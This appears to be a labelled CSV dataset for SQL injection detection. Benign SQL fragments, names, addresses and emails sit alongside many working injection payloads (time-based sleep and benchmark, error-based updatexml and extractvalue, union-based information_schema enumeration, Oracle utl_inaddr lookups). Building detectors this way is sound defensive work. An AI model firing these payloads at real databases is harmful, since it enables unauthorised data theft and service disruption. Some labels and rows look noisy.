query,label
begin user_lock.sleep  (  5  ),1
indocto,0
or isnull  (  1/0  )   /*,1
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )",1
43736952z,0
select * from hope fetch first 50 percent rows onlyselect top 3 * from recall,0
stadler_munks@chevrolet-volt.at,0
select cotton ( s )  from column full outer join,0
"select swept, day, chain from nothing where happily  is null",0
-3750'+  (  select alpu where 3911  =  3911 order by 1--,1
38182378d,0
select 18 mod 4;,0
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",1
"select oil,airplane,wool from term left join orders on shop.nutsid =  in.whenever order by held.wish",0
select avg ( bigger ) from surprise,0
"select reverse ( ""sql tutorial"" ) ;",0
"-9037%"" union all select 6583#",1
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",1
select * from actually where movie = 'paint',0
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )",1
54368029p,0
plaza tilos s/n,0
select sin ( -1 ) ;,0
paulovic,0
"select employees.create, count ( orders.homeid )  as captainfrom    ( ordersinner join tool on orders.simplestid  =  employees.dailyid )",0
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",1
select * from running where song = 'window'  and  ( deeply = 'slight' or exciting = 'sale' ),0
"-5150   )    )     )   union all select 5660,5660,5660#",1
select stuck ( s )  from development select though from upon,0
select * from spring,0
"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1
"select please,black,apart,leader,conversation     (  (  wonder join beginning on angle.zebra =  cattle.chicken )   inner join objecton orders.office =  natural.haveid )",0
9140,0
"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
64633352v,0
"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--",1
87,0
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1
savitsky@tetdevelocidad.sj,0
or 'something'   =   'some'+'thing',1
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'gbhd'  =  'gbhd",1
ornela,0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c888b6771b' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0
select * from anybody fetch first 3 rows only,0
select avg ( shallow ) from donkey,0
select * from wet where recent between '1996-07-01' and '1996-07-31',0
"select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1
-3520%' or 8571  =  8571--,1
"1'   )    )    as ylyq where 2953  =  2953 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
select option_value from wp_options where option_name  =  'options_location_address' limit 1,0
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",1
select music ( s )  from garden left join,0
ateniesa,0
1 where 6494  =  6494 and 8463  =  2760,1
-2483' where 1327  =  1327 union all select 1327#,1
select avg ( star ) from scientist,0
rhetta,0
"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#",1
end and   (  4610  =  4610,1
"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,1
select count ( * )  as wet,0
7.95304e+15,0
1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
select adventure from farm,0
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1
-2929'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'nzmk'  =  'nzmk,1
cousinea,0
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""jgcv""  =  ""jgcv",1
7011,0
95868852e,0
"select three as halfway, pipe as [burn]  from fallen",0
"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",1
"select * from fourth order by dust asc, talk desc",0
1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,1
chistiakov@zytechwind.ke,0
1%' order by 1#,1
"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,1
select top 50 percent * from kept,0
1   )    )    as ogcv where 4396  =  4396,1
select * from worse where herself = 'although'  and city = 'farm',0
1  )   as vxsh where 4706  =  4706,1
"select * from judge order by means, flow",0
"select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1
"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select laid,primitive,pass,education,above     (  (  select join cross on roll.indicate =  notice.region )   inner join typicalon orders.pound =  aid.filmid )",0
"select * from hunt where drew not in  ( 'snake', 'hill', 'plural' )",0
chanampa coromino,0
select distinct positive from fallen,0
padiernos,0
select * from unhappy fetch first 50 percent rows only,0
9857,0
select top 3 * from sleep select * from title 3select * from silly,0
select * from price where frame between '1996-07-01' and '1996-07-31',0
fuente el saz,0
"cerollera, la",0
1'   )    )    as qswu where 6377  =  6377,1
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
8110,0
5.91692e+15,0
"iif  (  9875  =  8961,1,1/0  )",1
select * from  ( select drove from check ),0
leonila,0
"1%'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",1
select * from stuck where related = 'serious'  and city = 'former',0
"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",1
segura de los baos,0
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",1
"select orders.probablyrid, employees.place, employees.there from ordersright join employees on orders.employeeid  =  employees.rodid order by orders.physicalid",0
"select muscle,thought,pay,depend,replied     (  (  forty join pencil on picture.club =  worried.shelter )   inner join adjectiveon orders.every =  how.averageid )",0
select * from farther where might = 'neighborhood' fetch first 3 rows only,0
1980,0
select very ( s from slightly right join,0
"select 'customer' as type, contactname, city, countryfrom customers  unionselect 'supplier', contactname, city, country",0
"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )",1
"1%""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""%""  =  """,1
8.55461e+15,0
select measure from chain union all select proud from wheat order by powder,0
"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
campament 33,0
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec  (  @q  ),1
"1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
select why ( s ) from cow inner join,0
select * from pull 3 select * from topic,0
"select * from spite where strong in  ( 'blood', 'ancient', 'slight' )",0
select * from biggest where aboard = 'lamp'  and  ( practice = 'canal' or back = 'desert' ),0
supersticin,0
"select wealthid as id, particularly as brown from break",0
46942381w,0
"select empty, wagon+ ', ' + or+ ' ' + dropped+ ', ' + smooth as did  from crowd",0
"select column_name ( s )  from slight,according",0
print,1
select top 50 percent * from noise,0
select prevent ( s )  from saw,0
select * from practice where waste = 'board'  and city = 'control',0
"-2898"" where 3301  =  3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",1
select top 3 * from throat where jar = 'son',0
-3431%'  )   or 9323  =  9323#,1
select * from dust fetch first 3 rows only select top 50 percent * from wherever,0
1  )   as iiku where 9466  =  9466,1
select avg ( rest ) from toy select sum ( be ),0
16574331w,0
16630,0
select count ( against ) from hang,0
demarco_phuong@beesmer.me,0
1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,1
"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--",1
"and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  4   )    )    and 'i'  =  'i",1
"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"select * from long where contain not in  ( 'southern', 'two', 'desk' )",0
"select atan2 ( -0.8, 2 ) ;",0
select * from entire fetch first 3 rows only select top 50 percent * from finish,0
select bare from spell,0
from  ( select distinct therefore from recall ),0
select * from satellites where id = 1 and 1=1 and id = 1,1
"1""  )   as rcnk where 1800  =  1800",1
select function ( s )  from whispered full outer join,0
v,1
geria,0
select noise ( s )  from south full outer join,0
1'+  (  select 'jaok' where 2592  =  2592,1
select * from harbor fetch first 50 percent rows only,0
"select * from sets order by torn asc, cat desc",0
"select count ( motor ) , brick from press by outline",0
xaudiera alicea,0
1 where 4091  =  4091,1
"select until,tube,blow from stopped left join orders on engine.silenceid =  everything.change order by metal.universe",0
alguer murillo,0
"1   )    )    or benchmark  (  10000000,md5  (  1   )    )   #",1
1'||  (  select 'ymre' where 8681  =  8681,1
torrescrcela,0
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
select top 50 percent * from disease,0
jochen,0
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929",1
45810,0
"select opposite, situation, foot from soft where buffalo  is null",0
update basic set proper = 'bag'where high = 'did',0
"select giant as rhyme, copper as [particular]  from loose",0
cholgua,0
select avg ( hand ) from term select sum ( stomach ),0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,1
rosset,0
"and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  3   )    )    and 'i'  =  'i",1
"or 1  =  1 or """"  =",1
select describe ( s )  from hay full outer join,0
select avg ( alphabet )  from image  select sum ( company ),0
"1%""   )    )    union all select null,null,null,null,null#",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,1
select * from family where national = 'finish'  and  ( thousand = 'how' or shout = 'pan' ),0
1'||  (  select 'etvo' from dual where 1557  =  1557,1
select * from needs where here = 'deer'  or situation = 'donkey',0
"select orders.enginerid, employees.necessary, employees.mountain from ordersright join employees on orders.employeeid  =  employees.cameid order by orders.everyoneid",0
"1""   )    )    as vxkn where 2443  =  2443 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
"select * from users where id  =  1 or \+<\ union select 1,@@version -- 1",1
select * from pair where mission between '1996-07-01' and '1996-07-31',0
update now set kind = 'avoid'where lot = 'his',0
"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
select * from distance fetch first 3 rows only select top 50 percent * from see,0
select case when 6558  =  4327 then 1 else null end--,1
1'   )    )     )   and 7533  =  7533 and    (    (     (  'txex'  =  'txex,1
select * from fog where square  between 10 and 20,0
select * from egg  where women not like '[there]%',0
orazio,0
lncara,0
select count ( * )  as knew,0
"carretera ribas matama 160,",0
select * from anomaly_reports where altitude_km > 0 or 1=1,1
select top 3 * from wire where theory = 'become',0
1  )   as hhly where 2906  =  2906,1
villarejo del valle,0
if  (  5896  =  4251  )   select 5896 else drop function xmyk--,1
select count ( natural ) from something,0
-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--,1
"c/ aira de villaescusa 199, 1f",0
select camp ( s )  from situation full outer join,0
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,1
8.18595e+15,0
fontaine@viajesdacapalla.gd,0
select column_name ( s )  from table1 full outer join,0
"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )",1
1'||  (  select 'gmkp' where 6016  =  6016,1
select clear from heading union all select brought from quietly order by far,0
49718,0
select avg ( judge ) from shoulder select sum ( enter ),0
"1'  )   where 1625  =  1625 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 14113 )  order by meta_id asc",0
select * from salmon  where principal not like '[his]%',0
select stretch ( s )  from twelve select grass from aid,0
"select alike,tell,pile from usually left join orders on yesterday.silkid =  feet.zero order by steady.hill",0
select equally from reader union select gasoline from bread order by boat,0
select top 3 * from consist where pour = 'kept' select * from whether,0
siomara,0
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""bmbg"" like ""bmbg",1
"1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --",1
villadecanes,0
"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",1
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye",1
update once set stay = 'smell'where worth = 'dirt',0
"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1
stetson,0
select * from society where adult not like 'voyage%',0
select * from have where egg between '1996-07-01' and '1996-07-31',0
1  )   where 4548  =  4548 and 9198  =  9198--,1
"select * from daily where spin in  ( 'spring', 'load', 'hold' )",0
waitfor delay '0:0:5' and    (    (   7619  =  7619,1
"select t.*, tt.* from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id where tt.taxonomy in  ( 'property_label' )  order by t.name asc",0
9334,0
"1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
castillejo de meslen,0
guasch xifr,0
select * from parent where not could = 'nation'  and not prevent = 'thank',0
1%'   )    )    waitfor delay '0:0:5'--,1
"travesia palacio 61, 1?d",0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",1
select * from close order by grow desc,0
select * from me fetch first 3 rows only,0
"1""  )   as rbgl where 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
foguear,0
"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
bendixsen9@foreignoffice.ps,0
trixy,0
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1
6091,0
"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  3872  =  3872",1
select top 3 * from moving,0
"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",1
zarzuela,0
"-5169""   )    )    union all select 6198,6198,6198,6198--",1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'knhm'  =  'knhm",1
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,1
select distinct meet from got,0
spnola ballado,0
1'  )   as lgex where 4068  =  4068 and 1378  =  9247--,1
select option_value from wp_options where option_name  =  'houzez_tax_settings' limit 1,0
"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",1
"select soilid as id, muscle as many from band",0
select * from rubber 3 select * from average,0
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",1
select top 3 * from hand select * from writer 3select * from seeing,0
"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",1
select wp_posts.* from wp_posts where 1 = 1 and wp_posts.id  =  27990 and wp_posts.post_type  =  'page' order by wp_posts.post_date desc,0
"select * from users where id  =  '1' + $+*$ union select 1,@@version -- 1'",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",1
"1'   )    )    union all select null,null,null,null,null,null,null,null--",1
select electric ( s )  from equally union,0
1'   )    )    as rxxd where 5049  =  5049,1
select * from happened where carefully between '1996-07-01' and '1996-07-31',0
select * from what where by = 'quarter',0
3.81793e+14,0
select avg ( wind ) from certain select sum ( hospital ),0
1 where 7802  =  7802,1
select yellow ( s )  from knowledge select ocean from audience,0
"1 where 3478  =  3478   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
5.66e+15,0
pozaldez,0
abaeto sanchon,0
"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",1
"select * from spend where full between ""discovery"" and    ""brought""",0
select avg ( price ) from guess,0
navratil@sindns.as,0
mandruso,0
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,1
atabillar,0
cesarin,0
beato,0
select option_value from wp_options where option_name  =  '_options_footer_bottom_content' limit 1,0
"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
update flame set wish = 'mouth'where lovely = 'cave',0
select top 50 percent * from glass select * from camp fetch first 50 percent rows onlyselect top 3 * from sleep,0
)   union select * from information_schema.tables;,1
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,1
"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
select * from water where author like '%pour%',0
select avg ( price ) from hide,0
"select * from careful where lift between ""ground"" and    ""history""",0
"select * from users where id  =  1 or @#""{  =  1 or 1  =  1 -- 1",1
""" or """"-""",1
bethania,0
1'||  (  select 'lnhq' where 7526  =  7526,1
select top 50 percent * from sense,0
"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"select column_name ( s )  from difference,minute",0
select avg ( model ) from stick,0
"1   )    )    as spdf where 8554  =  8554 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
select count ( distinct closer )  from pipe,0
select * from ocean,0
select curdate (  ) ;,0
select * from shore,0
select top 3 * from opposite where place = 'beside',0
select slope ( s )  from lying,0
select count ( go ) from throat,0
select * from arrow  where interest = mouth,0
6336,0
select * from blow order by lady,0
"-6389"" union all select 2355,2355,2355,2355,2355--",1
"select molecular,my from attempt where principle = 'far' union select want, behind from bigger",0
"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",1
"-8709"" or 8571  =  8571--",1
1%'   )    )    or sleep  (  5  )  #,1
dyck,0
"select employees.final, count ( orders.earlyid )  as carfrom    ( ordersinner join which on orders.supportid  =  employees.soilid )",0
"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",1
"pasaje cox 194, 5?f",0
"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1
select * from honor 3,0
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )",1
select * from street 3,0
select count ( team )  from expect,0
1%' rlike sleep  (  5  )   and '%'  =  ',1
vilaprio,0
1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1
select * from  ( select porch from complete ),0
langellotti,0
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",1
reinazgo,0
select avg ( quickly )  from master  select sum ( vowel ),0
-4896'  )   union all select 1929--,1
"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )",1
"select * from half where excitement in  ( 'neighbor', 'blanket', 'meant' )",0
"select busy, invented, chief from view where tool  is null",0
fenton@tiposdedrogas.je,0
select * from operators where id = 1 or id = 2 or id = 3,0
heicy,0
manda,0
"insert into magnet ( fight, birds, team, lift, wet, shall )  values  ( 'raw', 'save'. trap', 'official', 'spite', 'weigh', 'mathematics' )",0
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'dphz'  =  'dphz",1
select count ( anyone ) from mistake,0
select distinct satisfied from root,0
update grain set bark = 'tower'where easier = 'coast',0
"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",1
"select position ( ""3"" in ""w3schools.com"" )  as matchposition;",0
select avg ( price ) from home,0
delete from port,0
"select count ( police ) , official from won by bring",0
"1'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
select count ( fly ) from series,0
select   (  case when   (  3859  =  6938  )   then 3859 else 3859*  (  select 3859 from mysql.db  )   end  )  #,1
select * from orbit_params where id = 1 and 1=1 and id = 1,1
select * from matter where identity between '1996-07-01' and '1996-07-31',0
7.01035e+15,0
"1""  )   as wvxt where 7321  =  7321 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
select top 3 * from pair where five = 'avoid' select * from chose,0
mclendon,0
marlsela,0
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1
"c/ rua mayor, 31, 1?e",0
6.52922e+15,0
elsen@whitehat.td,0
"select plates, factor+ ', ' + won+ ' ' + bush+ ', ' + drive as would  from central",0
select steady ( s )  from felt left join,0
"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
select top 50 percent * from popular,0
"segura 30,",0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",1
"insert into sudden ( anybody, turn, faster, replace, tune, rose )  values  ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )",0
